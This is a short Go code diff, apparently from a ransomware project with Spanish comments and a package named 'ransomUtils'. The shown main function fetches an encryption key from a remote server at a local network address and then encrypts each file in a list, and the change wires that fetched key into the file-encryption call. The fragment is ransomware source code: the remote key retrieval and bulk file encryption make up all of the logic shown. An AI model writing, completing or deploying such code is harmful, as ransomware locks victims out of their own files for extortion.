@@ -9,7 +9,7 @@ import (
 //const key = "clave"
 
 func main() {
-	key, err := ransomUtils.obtenerClave("192.168.1.43:9090")
+	key, err := ransomUtils.ObtenerClave("192.168.1.43:9090")
 	if err != nil {
 		fmt.Println("Error al obtener la palabra:", err)
 		return
@@ -25,7 +25,7 @@ func main() {
 	}
 	fmt.Println("Cifrando los siguientes archivos:")
 	for _, file := range files {
-		errEncrypt := ransomUtils.EncryptFile(file)
+		errEncrypt := ransomUtils.EncryptFile(file, key)
 		if errEncrypt != nil {
 			println("Error encriptando:", file, "\n", errEncrypt)
 		}
